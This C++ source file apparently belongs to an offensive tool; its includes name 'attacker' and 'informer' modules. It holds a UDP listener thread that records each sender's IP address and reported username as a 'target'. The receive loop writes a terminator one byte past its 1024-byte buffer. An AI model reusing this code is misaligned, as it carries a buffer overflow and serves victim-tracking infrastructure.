#include <conio.h>
#include "InformerSvrUdp.h"
#include "informerServer.h"
#include "../utils/BaseSocket.h"
#include "../attacker.h"
#include "../informer.h"
#include "InformerInterface.h"
#include "sslPublic.h"
#include "../HttpUtils.h"
#include "../DnsUtils/dnsUtils.h"
#include "../Utils/Tools.h"



InformerSvrUDP::InformerSvrUDP(InformerInterface*interface) {
	mInterface = interface;
	mUdp = this;
	CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)informerUdpListener, this, 0, 0));
}


InformerSvrUDP::~InformerSvrUDP() {

}




int __stdcall InformerSvrUDP::informerUdpListener(InformerSvrUDP* instance) {
	int ret = 0;

	int sock = BaseSocket::listenUdpPort(INFORMER_PORT);
	if (sock == INVALID_SOCKET)
	{
		char szout[1024];
		wsprintfA(szout, "%s %d error\r\n", __FUNCTION__, __LINE__);
		log(szout);
		MessageBoxA(0, szout, szout, MB_OK);
		ExitProcess(0);
	}

	char buf[1024];

	CONNECTION_INFO connectinfo = { 0 };
	while (TRUE)
	{
		int caSize = sizeof(sockaddr_in);

		connectinfo.udptarget = instance->mUdp;
		connectinfo.interface = instance->mInterface;

		int recvlen = recvfrom(sock, buf, sizeof(buf), 0,(sockaddr*)&connectinfo.sa, &caSize);

		if (recvlen > 0)
		{
			*(buf + recvlen) = 0;

			unsigned long inetip = connectinfo.sa.sin_addr.S_un.S_addr;

			string ip = HttpUtils::getIPstr(inetip);

			string username = string(buf);

			ret = connectinfo.interface->storeTarget(ip, username);
		}
		else
		{
			log("%s %d error\r\n", __FUNCTION__, __LINE__);
			continue;
		}
	}
	closesocket(sock);
}